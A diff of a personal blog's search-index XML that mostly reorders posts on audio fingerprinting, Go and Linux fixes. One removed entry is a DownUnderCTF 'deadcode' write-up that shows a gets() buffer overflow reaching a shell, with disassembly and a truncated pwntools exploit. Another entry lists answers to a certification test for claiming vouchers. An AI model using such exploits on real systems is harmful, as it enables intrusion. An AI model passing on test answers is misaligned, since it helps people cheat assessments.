@@ -369,15 +369,6 @@
       </categories>
   </entry>
   <entry>
-    <title>我是茄子</title>
-    <url>/2018/10/03/blogarchive/2018-10-03-22-50-44/</url>
-    <content><![CDATA[<p>我鸟你妈的怎么垫底的又是我<br><br><a href="http://www.huomao.com/9418">点击进入我的直播间</a></p>
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-  </entry>
-  <entry>
     <title>新的小工具--quizlet单词获取器</title>
     <url>/2018/10/21/blogarchive/2018-10-21-00-21-20/</url>
     <content><![CDATA[<p>#quizlet单词获取器<br><del>感觉博客空荡荡的，所以发一个</del><br><br><del>反正没人看</del><br><br>就是一个小工具，输入地址，然后就把单词和意思跳出来。可以做单词表用，其他没什么用处emmmmm。<br><br>感觉还真没什么用处。。。。<br><br><em>谁会来用这个啊喂</em><br><br>还是放点图出来吧。。。<br><br>输入链接<br><br><img src="https://i.loli.net/2018/10/21/5bcb54c734014.png" alt="输入链接"><br>获取成功<br><br><img src="https://i.loli.net/2018/10/21/5bcb54c6e3346.png" alt="获取成功"><br>随机生成<br><br><img src="https://i.loli.net/2018/10/21/5bcb54c726d72.png" alt="随机生成"></p>
@@ -394,6 +385,15 @@
 <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=450 src="//music.163.com/outchain/player?type=0&id=2230227224&auto=1&height=430"></iframe>]]></content>
       <categories>
         <category>Life</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>我是茄子</title>
+    <url>/2018/10/03/blogarchive/2018-10-03-22-50-44/</url>
+    <content><![CDATA[<p>我鸟你妈的怎么垫底的又是我<br><br><a href="http://www.huomao.com/9418">点击进入我的直播间</a></p>
+]]></content>
+      <categories>
+        <category>系统默认</category>
       </categories>
   </entry>
   <entry>
@@ -531,88 +531,6 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </tags>
   </entry>
   <entry>
-    <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
-    <url>/2019/02/09/blogarchive/2019-02-09-20-39-15/</url>
-    <content><![CDATA[<p>第三部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 </p>
-<p>paper下载链接：<a href="https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf">https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf</a><br>中文翻译：<a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a><br>建议读英文的鸭。</p>
-<p>为获得良好的阅读体验，你可能先需要了解 mysql数据库的基础知识，python基础语法，一定的代码阅读能力，一定的语文理解能力(up写的很乱)。</p>
-<p>好的，那么今天我们进入最后一部分，搜索与匹配。</p>
-<p>Up在这里使用了orm框架SQLalchemy</p>
-<p>首先，我们要建立起一个数据库来储存上一步中获取的指纹信息。</p>
-<p>其中一个表来储存歌曲信息，一个表来储存歌曲信息对应的指纹，两个表用歌曲的id作为外键相连。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec8390fcbc.jpg" alt="sqlalchemy的格式"></p>
-<p>注意，fingerprint 这个column 必须要加上index，这将会大大减少查询速度，千真万确。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec838e9dd2.jpg" alt="songs表"><br>songs 表为歌曲信息表：</p>
-<p>id 用来储存歌曲id，</p>
-<p>name用来存储歌曲名字</p>
-<p>filehash用来储存该歌曲文件的哈希</p>
-<p>fingerprinted用来判断该歌曲是否已经进行了fingerprint</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec838bfdee.jpg" alt="fingerprints表"></p>
-<p>Fingerprints 表为储存指纹的表：</p>
-<p>id为指纹id，没什么用</p>
-<p>song_id 是外键，记录对应的歌曲信息</p>
-<p>fingerprint就是获取到的指纹信息</p>
-<p>offset就是该指纹的offset位置</p>
-<p>建完这个表，然后你就可以把指纹信息全都放进去了。</p>
-<p>然后，我们来讲讲搜索与识别的基本原理：</p>
-<p>1.首先输入一段声音，然后和之间一样，获取这一段声音的指纹。</p>
-<p>2.对获取到的每一个指纹，在数据库中搜索相同的指纹，并将指纹对应的歌曲信息，以及offset偏移值保存。</p>
-<p>3.有相同offset差值越多的歌曲就是识别出的歌曲。</p>
-<p>tk’=tk+offset,</p>
-<p>这样子说可能有点抽象，我们来举个栗子:</p>
-<p>假如在某个音频中，你提取到了1个指纹，这个指纹是 c19dde0ecb8fca81b6c98d5ee3775c26cbb32a610c82a5ecda515b0beb86d357， 且它在那段音频中的offset 是 30。</p>
-<p>通过这个指纹，你在数据库中取到了如下的数据</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec838ebb90.jpg" alt="取得的数据"></p>
-<p>然后我们可以计算得到 offset 差值分别为 70, 70 ,170, 20, 93, 160, 90, 70</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec83907757.jpg" alt="计算后"></p>
-<p>在这里，我们可以看到，offset差值是70 且 id 为 1 的有3 个，offset差值是170 且 id 为 1的有一个，offset差值是20 且 id 为 2 的有1 个，offset差值是933 且 id 为 3 的有一个……</p>
-<p>所以最多就是 有3个的那个值。也就是id为1的歌曲。</p>
-<p>有人会问，为什么不一首歌一首歌的检索呢，因为慢。</p>
-<p>接下来代码。<br>获取所有匹配的指纹，并将歌曲信息与offset差值保存下来。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec838d9044.jpg" alt="匹配"></p>
-<p>对数据进行处理，得出相同offset差值最多的歌曲，也就是识别出来的歌曲。</p>
-<p><img src="https://i.loli.net/2019/02/09/5c5ec838f1c1a.jpg" alt="处理"></p>
-<p>结束。</p>
-<p>转载请先获得许可</p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>shazam</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Fininshing Update Shazam analysis(chinese version)</title>
-    <url>/2019/02/09/blogarchive/2019-02-09-20-46-15/</url>
-    <content><![CDATA[<p>See </p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
-<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>shazam</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>raspberry pi using vnc, can&#39;t log in.</title>
-    <url>/2019/02/09/blogarchive/2019-02-09-20-53-39/</url>
-    <content><![CDATA[<p>Last night, when i was using vnc to log in my ras pi, i found that i stuck in the login menu.</p>
-<p>which means even i type the correct password, after several sec, it going back to the login menu.</p>
-<p>So, it turns out vnc may have some authoritive problem. WE can simply solve this problem by log in the ssh use：</p>
-<p><code>rm -rf /home/pi/.Xauthority</code></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-      <tags>
-        <tag>raspberryPi</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>shazam听歌识曲算法解析+python实现-2 生成指纹</title>
     <url>/2019/02/09/blogarchive/2019-02-09-17-01-47/</url>
     <content><![CDATA[<p>第二部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》，最好是一个字一个字，一个图一个图的把paper看下来（然后你就不需要来看这篇文章了，笑）</p>
@@ -692,6 +610,88 @@ def generateFilehash(filepath, blocksize=2 ** 16):
       </categories>
       <tags>
         <tag>shazam</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Fininshing Update Shazam analysis(chinese version)</title>
+    <url>/2019/02/09/blogarchive/2019-02-09-20-46-15/</url>
+    <content><![CDATA[<p>See </p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/13">First section</a><br>-<a href="https://www.bilibili.com/read/cv1904784">Bilibili</a></p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/14">Second section</a>-<a href="https://www.bilibili.com/read/cv1965924">Bilibili</a></p>
+<p><a href="https://www.lxgshadow.us/blog/article-detail/15">Third section</a>-<a href="https://www.bilibili.com/read/cv2016569">Bilibili</a></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>shazam</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Shazam听歌识曲算法解析+python实现-3 检索歌曲</title>
+    <url>/2019/02/09/blogarchive/2019-02-09-20-39-15/</url>
+    <content><![CDATA[<p>第三部份<br>在开始之前，我们首先要认真阅读一下论文《An Industrial-Strength Audio Search Algorithm》。 </p>
+<p>paper下载链接：<a href="https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf">https://www.ee.columbia.edu/~dpwe/papers/Wang03-shazam.pdf</a><br>中文翻译：<a href="https://blog.csdn.net/yutianzuijin/article/details/49787551">https://blog.csdn.net/yutianzuijin/article/details/49787551</a><br>建议读英文的鸭。</p>
+<p>为获得良好的阅读体验，你可能先需要了解 mysql数据库的基础知识，python基础语法，一定的代码阅读能力，一定的语文理解能力(up写的很乱)。</p>
+<p>好的，那么今天我们进入最后一部分，搜索与匹配。</p>
+<p>Up在这里使用了orm框架SQLalchemy</p>
+<p>首先，我们要建立起一个数据库来储存上一步中获取的指纹信息。</p>
+<p>其中一个表来储存歌曲信息，一个表来储存歌曲信息对应的指纹，两个表用歌曲的id作为外键相连。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec8390fcbc.jpg" alt="sqlalchemy的格式"></p>
+<p>注意，fingerprint 这个column 必须要加上index，这将会大大减少查询速度，千真万确。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec838e9dd2.jpg" alt="songs表"><br>songs 表为歌曲信息表：</p>
+<p>id 用来储存歌曲id，</p>
+<p>name用来存储歌曲名字</p>
+<p>filehash用来储存该歌曲文件的哈希</p>
+<p>fingerprinted用来判断该歌曲是否已经进行了fingerprint</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec838bfdee.jpg" alt="fingerprints表"></p>
+<p>Fingerprints 表为储存指纹的表：</p>
+<p>id为指纹id，没什么用</p>
+<p>song_id 是外键，记录对应的歌曲信息</p>
+<p>fingerprint就是获取到的指纹信息</p>
+<p>offset就是该指纹的offset位置</p>
+<p>建完这个表，然后你就可以把指纹信息全都放进去了。</p>
+<p>然后，我们来讲讲搜索与识别的基本原理：</p>
+<p>1.首先输入一段声音，然后和之间一样，获取这一段声音的指纹。</p>
+<p>2.对获取到的每一个指纹，在数据库中搜索相同的指纹，并将指纹对应的歌曲信息，以及offset偏移值保存。</p>
+<p>3.有相同offset差值越多的歌曲就是识别出的歌曲。</p>
+<p>tk’=tk+offset,</p>
+<p>这样子说可能有点抽象，我们来举个栗子:</p>
+<p>假如在某个音频中，你提取到了1个指纹，这个指纹是 c19dde0ecb8fca81b6c98d5ee3775c26cbb32a610c82a5ecda515b0beb86d357， 且它在那段音频中的offset 是 30。</p>
+<p>通过这个指纹，你在数据库中取到了如下的数据</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec838ebb90.jpg" alt="取得的数据"></p>
+<p>然后我们可以计算得到 offset 差值分别为 70, 70 ,170, 20, 93, 160, 90, 70</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec83907757.jpg" alt="计算后"></p>
+<p>在这里，我们可以看到，offset差值是70 且 id 为 1 的有3 个，offset差值是170 且 id 为 1的有一个，offset差值是20 且 id 为 2 的有1 个，offset差值是933 且 id 为 3 的有一个……</p>
+<p>所以最多就是 有3个的那个值。也就是id为1的歌曲。</p>
+<p>有人会问，为什么不一首歌一首歌的检索呢，因为慢。</p>
+<p>接下来代码。<br>获取所有匹配的指纹，并将歌曲信息与offset差值保存下来。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec838d9044.jpg" alt="匹配"></p>
+<p>对数据进行处理，得出相同offset差值最多的歌曲，也就是识别出来的歌曲。</p>
+<p><img src="https://i.loli.net/2019/02/09/5c5ec838f1c1a.jpg" alt="处理"></p>
+<p>结束。</p>
+<p>转载请先获得许可</p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>shazam</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>raspberry pi using vnc, can&#39;t log in.</title>
+    <url>/2019/02/09/blogarchive/2019-02-09-20-53-39/</url>
+    <content><![CDATA[<p>Last night, when i was using vnc to log in my ras pi, i found that i stuck in the login menu.</p>
+<p>which means even i type the correct password, after several sec, it going back to the login menu.</p>
+<p>So, it turns out vnc may have some authoritive problem. WE can simply solve this problem by log in the ssh use：</p>
+<p><code>rm -rf /home/pi/.Xauthority</code></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
+      </categories>
+      <tags>
+        <tag>raspberryPi</tag>
       </tags>
   </entry>
   <entry>
@@ -1034,6 +1034,32 @@ alter table fingerprints drop partition p20
       </tags>
   </entry>
   <entry>
+    <title>阿里云白嫖</title>
+    <url>/2019/09/03/blogarchive/2019-09-03-20-18-17/</url>
+    <content><![CDATA[<p>从群里看见的</p>
+<p>大概能拿200代金券</p>
+<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
+<p>选java高级测试</p>
+<p>答案:</p>
+<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
+<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
+<p>object类中的getclass（）方法不能被覆写</p>
+<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
+<p>serializable接口无法实现多线程子类定义</p>
+<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
+<p>当执行“Math.round（-15.61）&quot;程序后的计算结果是哪个？<br>-16</p>
+<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
+<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>aliyun</tag>
+        <tag>白嫖</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>记一次阿里云学生服务器白嫖</title>
     <url>/2019/09/03/blogarchive/2019-09-03-20-51-24/</url>
     <content><![CDATA[<h3 id="购买服务器-白嫖"><a href="#购买服务器-白嫖" class="headerlink" title="购买服务器 (白嫖)"></a>购买服务器 (白嫖)</h3><hr>
@@ -1063,34 +1089,8 @@ alter table fingerprints drop partition p20
         <category>Life</category>
       </categories>
       <tags>
-        <tag>白嫖</tag>
         <tag>aliyun</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>阿里云白嫖</title>
-    <url>/2019/09/03/blogarchive/2019-09-03-20-18-17/</url>
-    <content><![CDATA[<p>从群里看见的</p>
-<p>大概能拿200代金券</p>
-<p>地址: <a href="https://developer.aliyun.com/certification?inviteCode=pifgful6xp346">https://developer.aliyun.com/certification?inviteCode=pifgful6xp346</a></p>
-<p>选java高级测试</p>
-<p>答案:</p>
-<p>下面关于数组排序的说明哪项是错误的？<br>Comparator接口中提供有compare（）方法实现数组的排序操作</p>
-<p>使用Runtime类的gc（）方法，可以释放垃圾内存</p>
-<p>object类中的getclass（）方法不能被覆写</p>
-<p>synchronized关键字常用来为对象加锁，从而使得对对象的访问是排他的</p>
-<p>serializable接口无法实现多线程子类定义</p>
-<p>如果要实现多线程编程下面哪项描述是错误的？<br>多线程处理类可以继承Synchronized类，同时覆写run（）方法如果要为对象回收做收尾操作，应该覆写objectt类中的finalize（）方法</p>
-<p>当执行“Math.round（-15.61）&quot;程序后的计算结果是哪个？<br>-16</p>
-<p>public string tostring（）<br>不是object类所提供的线程操作方法</p>
-<p>下列关于Date描述错误的一项<br>直接输出Date类对象就可以取得日期时间数据，但是取得的月数是从0开始计算的</p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
         <tag>白嫖</tag>
-        <tag>aliyun</tag>
       </tags>
   </entry>
   <entry>
@@ -1304,15 +1304,6 @@ server {
       </tags>
   </entry>
   <entry>
-    <title>utf-8 乱码表</title>
-    <url>/2019/09/06/blogarchive/2019-09-06-10-34-25/</url>
-    <content><![CDATA[<p><img src="/images/20201124847.png" alt="utf 乱码表"></p>
-]]></content>
-      <categories>
-        <category>Programming</category>
-      </categories>
-  </entry>
-  <entry>
     <title>add cdn for live2d models</title>
     <url>/2019/09/16/blogarchive/2019-09-16-22-32-00/</url>
     <content><![CDATA[<p>add cdn for live2d models</p>
@@ -1320,6 +1311,15 @@ server {
 ]]></content>
       <categories>
         <category>SiteDev</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>utf-8 乱码表</title>
+    <url>/2019/09/06/blogarchive/2019-09-06-10-34-25/</url>
+    <content><![CDATA[<p><img src="/images/20201124847.png" alt="utf 乱码表"></p>
+]]></content>
+      <categories>
+        <category>Programming</category>
       </categories>
   </entry>
   <entry>
@@ -1498,6 +1498,28 @@ server {
       </categories>
       <tags>
         <tag>jetbrain</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
+    <url>/2019/10/29/blogarchive/2019-10-29-17-03-47/</url>
+    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
+<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
+<p>However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.</p>
+<hr>
+<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
+<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
+</li>
+<li><p>run the application and restart your computer.</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>系统默认</category>
+      </categories>
+      <tags>
+        <tag>solution</tag>
+        <tag>game</tag>
       </tags>
   </entry>
   <entry>
@@ -1701,28 +1723,6 @@ https://www.bsfdvbsbilibili.com
       <tags>
         <tag>bilibili</tag>
         <tag>re</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Paradox Interactive games can&#39;t run on windows + Solution</title>
-    <url>/2019/10/29/blogarchive/2019-10-29-17-03-47/</url>
-    <content><![CDATA[<h3 id="Issue"><a href="#Issue" class="headerlink" title="Issue"></a>Issue</h3><p>Some people may find that paradox games such as Heart of Iron will crash on windows 10.</p>
-<p>According to the steam page, paradox games often require directX 9.0c as the running time. </p>
-<p>However, since windows 10 doesn&#39;t support directX anymore. And windows 10 pre-install with directX 11. The games can&#39;t run properly.</p>
-<hr>
-<h3 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h3><ol>
-<li><p>go to <a href="https://blog.csdn.net/VBcom/article/details/9140197">https://blog.csdn.net/VBcom/article/details/9140197</a> and download the <strong>DirectX repair</strong></p>
-</li>
-<li><p>run the application and restart your computer.</p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>系统默认</category>
-      </categories>
-      <tags>
-        <tag>solution</tag>
-        <tag>game</tag>
       </tags>
   </entry>
   <entry>
@@ -1984,6 +1984,36 @@ https://www.bsfdvbsbilibili.com
       </categories>
       <tags>
         <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>为什么golang不能给map中的结构体(struct)直接赋值</title>
+    <url>/2022/07/18/coding/why-golang-can-t-assign-to-a-struct-field-in-map/</url>
+    <content><![CDATA[<p>今天在写代码的时候遇到了一个错误,</p>
+<p>在尝试编译的时候，编译器报了这个错误<code>cannot assign to struct field s.Templates[name].Template in map</code></p>
+<span id="more"></span>
+
+
+<h2 id="探索"><a href="#探索" class="headerlink" title="探索"></a>探索</h2><p>这里是出现问题的代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type WebTemplate struct &#123;</span><br><span class="line">	Name     string</span><br><span class="line">	Template string</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">type TemplateStore struct &#123;</span><br><span class="line">	Templates map[string]WebTemplate</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func (s *TemplateStore) Modify(name string, content string) &#123;</span><br><span class="line">	if _, ok := s.Templates[name]; ok &#123;</span><br><span class="line">		s.Templates[name].Template = content // 报错位置在这一行.</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在进行了一番搜索之后 <a href="https://stackoverflow.com/questions/32751537/why-do-i-get-a-cannot-assign-error-when-setting-value-to-a-struct-as-a-value-i">https://stackoverflow.com/questions/32751537/why-do-i-get-a-cannot-assign-error-when-setting-value-to-a-struct-as-a-value-i</a></p>
+<p>看了一下，出现这个问题的原因是因为golang对map的实现所造成的。</p>
+<p>因为golang的map实际上是一个可以扩展的结构体，也就是说，一个key对应的内存地址可能会因为map的扩大和缩小而产生改变</p>
+<p>举个粒子</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fmt.Println(&amp;myMap[&quot;asdf&quot;]) // 这个时候可能是 0x0010</span><br><span class="line">... // 一堆代码</span><br><span class="line">fmt.Println(&amp;myMap[&quot;asdf&quot;]) // 这个时候可能就变成了是 0x0030</span><br></pre></td></tr></table></figure>
+
+<p>所以，为了防止出现用户尝试赋值的时候，key所对应的内存地址发生变化，而导致赋值到错误的地址上。 就直接不让赋值给map中的struct了</p>
+<h2 id="解决方式"><a href="#解决方式" class="headerlink" title="解决方式"></a>解决方式</h2><p>我的解决方式还是比较简单的。</p>
+<p>直接把结构体<code>map[string]WebTemplate</code> 换成指针就行了 <code>map[string]*WebTemplate</code>。</p>
+<p>因为这样子的话，取值的时候是取到的一个指向WebTemplate的指针地址，这个指针地址是不会变的，所以可以放心赋值。</p>
+<p><strong>如果是结构体的话，他返回的是map里的一个地址，是有可能发生改变的</strong></p>
+]]></content>
+      <categories>
+        <category>Coding</category>
+      </categories>
+      <tags>
+        <tag>golang</tag>
       </tags>
   </entry>
   <entry>
@@ -2419,6 +2449,19 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
+    <title>MapleBacon First 1st Place in CTF</title>
+    <url>/2022/04/20/life/maple-bacon-first-first-place-in-ctf/</url>
+    <content><![CDATA[<p>It&#39;s the first first !!!!!!!!!</p>
+<p><img src="/2022/04/20/life/maple-bacon-first-first-place-in-ctf/2022-04-20_120515.png" alt="2022-04-20_120515.png"></p>
+]]></content>
+      <categories>
+        <category>Life</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于apt update到一半关机导致ubuntu系统崩溃这回事</title>
     <url>/2022/07/11/life/20220711-ri-ji/</url>
     <content><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>总之，今天在我的beelink小主机上捣鼓一些东西。</p>
@@ -2455,19 +2498,6 @@ https://www.bsfdvbsbilibili.com
         <tag>linux</tag>
         <tag>ubuntu</tag>
         <tag>碎碎念</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MapleBacon First 1st Place in CTF</title>
-    <url>/2022/04/20/life/maple-bacon-first-first-place-in-ctf/</url>
-    <content><![CDATA[<p>It&#39;s the first first !!!!!!!!!</p>
-<p><img src="/2022/04/20/life/maple-bacon-first-first-place-in-ctf/2022-04-20_120515.png" alt="2022-04-20_120515.png"></p>
-]]></content>
-      <categories>
-        <category>Life</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
       </tags>
   </entry>
   <entry>
@@ -2673,36 +2703,6 @@ https://www.bsfdvbsbilibili.com
       </tags>
   </entry>
   <entry>
-    <title>[writeup][DownUnderCTF 2021] pwn-deadcode</title>
-    <url>/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/</url>
-    <content><![CDATA[<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Arch:     amd64-64-little</span><br><span class="line"># RELRO:    Partial RELRO</span><br><span class="line"># Stack:    No canary found</span><br><span class="line"># NX:       NX enabled</span><br><span class="line"># PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>no pie enable. so we can simply overwrite.</p>
-<p>note that there are <code>gets</code> without length, which can perform <strong>buffoverflow</strong></p>
-<p><img src="/2021/10/09/ctfwriteup/ductf2021/ductf2021-pwn-deadcode/20211009120913.png" alt="stack"></p>
-<p>since s is above var_8h, we can write random 16 bytes + 0xdeadc0de in 8 bytes to overwrite var_8h to value of 0xdeadc0de, which will lead us to the shell.</p>
-<span id="more"></span>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nt main (int argc, char **argv, char **envp);</span><br><span class="line">; var char *s @ rbp-0x20</span><br><span class="line">; var uint64_t var_8h @ rbp-0x8</span><br><span class="line">0x00401195      push    rbp</span><br><span class="line">0x00401196      mov     rbp, rsp</span><br><span class="line">0x00401199      sub     rsp, 0x20</span><br><span class="line">0x0040119d      mov     qword [var_8h], 0</span><br><span class="line">0x004011a5      mov     eax, 0</span><br><span class="line">0x004011aa      call    buffer_init ; sym.buffer_init</span><br><span class="line">0x004011af      lea     rdi, str.I_m_developing_this_new_application_in_C__I_ve_setup_some_code_for_the_new_features_but_it_s_not__a_live_yet. ; 0x402008 ; const char *s</span><br><span class="line">0x004011b6      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011bb      lea     rdi, str.What_features_would_you_like_to_see_in_my_app ; 0x402078 ; const char *s</span><br><span class="line">0x004011c2      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011c7      lea     rax, [s]</span><br><span class="line">0x004011cb      mov     rdi, rax   ; char *s</span><br><span class="line">0x004011ce      mov     eax, 0</span><br><span class="line">0x004011d3      call    gets       ; sym.imp.gets ; char *gets(char *s)</span><br><span class="line">0x004011d8      mov     eax, 0xdeadc0de</span><br><span class="line">0x004011dd      cmp     qword [var_8h], rax</span><br><span class="line">0x004011e1      jne     0x401200</span><br><span class="line">0x004011e3      lea     rdi, str.Maybe_this_code_isn_t_so_dead... ; 0x4020a8 ; const char *s</span><br><span class="line">0x004011ea      call    puts       ; sym.imp.puts ; int puts(const char *s)</span><br><span class="line">0x004011ef      lea     rdi, str.bin_sh ; 0x4020cb ; const char *string</span><br><span class="line">0x004011f6      mov     eax, 0</span><br><span class="line">0x004011fb      call    system     ; sym.imp.system ; int system(const char *string)</span><br><span class="line">0x00401200      mov     eax, 0</span><br><span class="line">0x00401205      leave</span><br><span class="line">0x00401206      ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">undefined8 main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char *s;</span><br><span class="line">    uint64_t var_8h;</span><br><span class="line">    </span><br><span class="line">    var_8h = 0;</span><br><span class="line">    buffer_init();</span><br><span class="line">    puts(</span><br><span class="line">        &quot;\nI\&#x27;m developing this new application in C, I\&#x27;ve setup some code for the new features but it\&#x27;s not (a)live yet.&quot;</span><br><span class="line">        );</span><br><span class="line">    puts(&quot;\nWhat features would you like to see in my app?&quot;);</span><br><span class="line">    gets(&amp;s);</span><br><span class="line">    if (var_8h == 0xdeadc0de) &#123;</span><br><span class="line">        puts(&quot;\n\nMaybe this code isn\&#x27;t so dead...&quot;);</span><br><span class="line">        system(&quot;/bin/sh&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"># This exploit template was generated via:</span><br><span class="line"># $ pwn template &#x27;--host=pwn-2021.duc.tf&#x27; &#x27;--port=31916&#x27; deadcode</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># Set up pwntools for the correct architecture</span><br><span class="line">exe = context.binary = ELF(&#x27;deadcode&#x27;)</span><br><span class="line"></span><br><span class="line"># Many built-in settings can be controlled on the command-line and show up</span><br><span class="line"># in &quot;args&quot;.  For example, to dump all data sent/received, and disable ASLR</span><br><span class="line"># for all created processes...</span><br><span class="line"># ./exploit.py DEBUG NOASLR</span><br><span class="line"># ./exploit.py GDB HOST=example.com PORT=4141</span><br><span class="line">host = args.HOST or &#x27;pwn-2021.duc.tf&#x27;</span><br><span class="line">port = int(args.PORT or 31916)</span><br><span class="line"></span><br><span class="line">def start_local(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Execute the target binary locally&#x27;&#x27;&#x27;</span><br><span class="line">    if args.GDB:</span><br><span class="line">        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    else:</span><br><span class="line">        return process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">def start_remote(argv=[], *a, **kw):</span><br><span class="line">    &#x27;&#x27;&#x27;Connect to the process on the remote host&#x27;&#x27;&#x27;</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    if args.GDB:</span><br><span class="line">        gdb.attach(io, 